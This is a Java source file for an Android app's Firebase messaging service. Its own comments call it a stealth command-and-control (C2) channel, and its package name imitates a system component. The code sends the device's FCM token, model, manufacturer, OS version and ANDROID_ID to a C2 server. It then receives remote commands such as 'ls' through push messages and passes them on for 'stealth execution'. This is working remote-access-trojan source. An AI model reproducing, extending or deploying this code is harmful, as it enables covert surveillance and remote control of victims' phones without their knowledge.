package com.android.background.services;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * FCM message handler — receives stealth C2 trigger commands via Firebase.
 *
 * Architecture:
 *   C2 Server ──(FCM data msg)──→ Google FCM ──→ This Service
 *       │                                               │
 *       │  onMessageReceived()                          │
 *       │     ├─ Extract command from FCM data           │
 *       │     ├─ Dispatch to ConnectionManager           │
 *       │     └─ Result sent via brief socket connect    │
 *       │                                               │
 *       └──(HTTP POST)── FCM token registered ──────────┘
 */
public class FcmMessageService extends com.google.firebase.messaging.FirebaseMessagingService {

    private static final String TAG = "FCM";
    private static final int MAX_RETRIES = 3;

    /**
     * Called when a new FCM token is generated (initial install or refresh).
     * Sends the token to the C2 server for registration.
     */
    @Override
    public void onNewToken(@NonNull String token) {
        Log.d(TAG, "New FCM token: " + token.substring(0, Math.min(12, token.length())) + "...");
        registerTokenWithServer(getApplicationContext(), token);
    }

    /**
     * Called when an FCM data message arrives.
     * Data messages contain: {"order": "x0000sm", "extra": "ls"}
     * These are dispatched to ConnectionManager for stealth execution.
     */
    @Override
    public void onMessageReceived(@NonNull RemoteMessage message) {
        super.onMessageReceived(message);

        if (message.getData().isEmpty()) {
            Log.d(TAG, "Empty FCM data payload, ignoring");
            return;
        }

        Log.d(TAG, "FCM data message received: " + message.getData().keySet());

        try {
            JSONObject command = new JSONObject();
            for (String key : message.getData().keySet()) {
                command.put(key, message.getData().get(key));
            }

            String order = command.optString("order", "");
            if (order.isEmpty()) {
                Log.w(TAG, "FCM message has no 'order' field, ignoring");
                return;
            }

            Log.d(TAG, "FCM command received: " + order);
            ConnectionManager.executeFcmCommand(getApplicationContext(), command);

        } catch (Exception e) {
            Log.e(TAG, "Error processing FCM command: " + e.getMessage());
        }
    }

    /**
     * Registers this device's FCM token with the C2 server via HTTP POST.
     * Static method that takes a Context to avoid throwaway service instance issues.
     */
    public static void registerTokenWithServer(final Context ctx, final String token) {
        new Thread(() -> {
            String serverUrl = BuildConfig.SOCKET_URL;
            String registerUrl = serverUrl.replaceAll("/?$", "") + "/api/fcm/register";

            for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
                try {
                    URL url = new URL(registerUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    JSONObject payload = new JSONObject();
                    payload.put("token", token);
                    payload.put("model", android.os.Build.MODEL);
                    payload.put("manufacturer", android.os.Build.MANUFACTURER);
                    payload.put("release", android.os.Build.VERSION.RELEASE);
                    payload.put("deviceId",
                            android.provider.Settings.Secure.getString(
                                    ctx.getContentResolver(),
                                    android.provider.Settings.Secure.ANDROID_ID
                            ));

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.close();

                    int responseCode = conn.getResponseCode();
                    if (responseCode == 200) {
                        Log.d(TAG, "FCM token registered with server");
                        return;
                    } else {
                        Log.w(TAG, "FCM registration failed (attempt " + (attempt + 1) +
                                "): HTTP " + responseCode);
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    Log.w(TAG, "FCM registration error (attempt " + (attempt + 1) + "): " + e.getMessage());
                }
                try {
                    Thread.sleep(2000L * (attempt + 1));
                } catch (InterruptedException ignored) {
                }
            }
            Log.e(TAG, "FCM token registration failed after " + MAX_RETRIES + " attempts");
        }).start();
    }

    /**
     * Manually trigger FCM token registration from other components.
     * Retrieves the current token via Firebase and registers with server.
     */
    public static void registerToken() {
        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful() && task.getResult() != null) {
                        String token = task.getResult();
                        Log.d(TAG, "Retrieved FCM token for registration");
                        Context ctx = MainService.getContextOfApplication();
                        if (ctx != null) {
                            registerTokenWithServer(ctx, token);
                        } else {
                            Log.w(TAG, "Cannot register FCM token: context is null");
                        }
                    } else {
                        Log.w(TAG, "Failed to get FCM token", task.getException());
                    }
                });
    }
}
